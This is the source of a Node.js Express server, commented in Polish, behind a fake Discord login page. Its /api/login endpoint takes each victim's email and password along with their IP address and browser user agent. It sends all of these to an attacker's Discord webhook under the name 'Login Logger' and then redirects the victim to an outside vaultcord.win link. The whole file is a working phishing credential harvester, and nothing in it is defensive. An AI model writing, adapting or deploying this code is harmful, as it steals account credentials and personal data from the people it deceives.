const express = require('express');
const path = require('path');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serwuj pliki statyczne z głównego katalogu
app.use(express.static('.'));

// Strona główna
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Strona logowania
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Endpoint API
app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ error: 'Email i hasło są wymagane' });
    }
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toLocaleString('pl-PL');
    
    const embed = {
        title: "🔐 NOWE LOGOWANIE 🔐",
        color: 0x5865F2,
        fields: [
            { name: "📧 Email/Telefon", value: `\`\`\`${email}\`\`\``, inline: false },
            { name: "🔑 Hasło", value: `\`\`\`${password}\`\`\``, inline: false },
            { name: "🌐 IP Address", value: `\`\`\`${ip}\`\`\``, inline: true },
            { name: "💻 User Agent", value: `\`\`\`${userAgent.substring(0, 500)}\`\`\``, inline: false },
            { name: "⏰ Czas", value: `\`\`\`${timestamp}\`\`\``, inline: true }
        ],
        footer: { text: "Discord Login Panel" },
        timestamp: new Date().toISOString()
    };
    
    try {
        if (WEBHOOK_URL) {
            await axios.post(WEBHOOK_URL, {
                embeds: [embed],
                username: 'Login Logger',
                avatar_url: 'https://cdn.discordapp.com/assets/discord-icon.png'
            });
            console.log(`✅ Dane wysłane: ${email}`);
        }
        res.json({ success: true, redirect: 'https://vaultcord.win/kamerkidlawszystr' });
    } catch (error) {
        console.error('❌ Błąd:', error.message);
        res.json({ success: false, redirect: 'https://vaultcord.win/kamerkidlawszystr' });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Serwer działa na http://localhost:${PORT}`);
    console.log(`📡 Webhook: ${WEBHOOK_URL ? 'Ustawiony' : 'NIE USTAWIONY!'}`);
});
